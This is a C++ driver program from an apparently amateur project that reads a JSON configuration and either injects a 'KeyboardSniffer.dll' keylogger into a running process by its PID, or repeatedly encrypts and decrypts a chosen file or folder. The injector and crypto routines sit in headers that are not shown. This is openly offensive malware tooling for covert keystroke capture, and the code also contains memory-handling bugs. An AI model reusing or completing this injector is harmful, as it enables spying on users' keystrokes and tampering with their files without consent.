#include <iostream>
#include <json.hpp>
#include <fstream>
#include "Injector.h"
#include "Cryptographer.h"
#include<filesystem>

using namespace std;
using json = nlohmann::json;

int main()
{
	setlocale(LC_ALL, ".1251");
	ifstream file("C:\\Users\\Bzelga\\Desktop\\ManagingPCServices\\KeyboardSnifferInj\\outputFolder\\param.json");//при сборке из визуалки указывать полный путь 

	char* writable = new char[0];
	json j;
	file >> j;

	string pathFile = j["pathProgramm"].get<string>();
	if (pathFile != "")
	{
		writable = (char*)malloc((pathFile.size()+1)*sizeof(char*));
		//writable = new char[pathFile.size() + 1];
		copy(pathFile.begin(), pathFile.end(), writable);
		writable[pathFile.size()] = '\0';
	}

	switch (j["tpyeProgramm"].get<int>())
	{
	case 1:
		inject_DLL("C:\\Users\\Bzelga\\Desktop\\ManagingPCServices\\KeyboardSnifferInj\\outputFolder\\KeyboardSniffer.dll", j["PID"].get<int>());
		break;
	case 2:

		while (true)
		{
			if (filesystem::is_directory(writable))
			{
				EncryptionFiles(writable);
				DecryptionFiles(writable);
			}
			else
			{
				EncryptionFile(writable);
				DecryptionFile(writable);
			}
		}

		delete[] writable;
		break;
	}
}

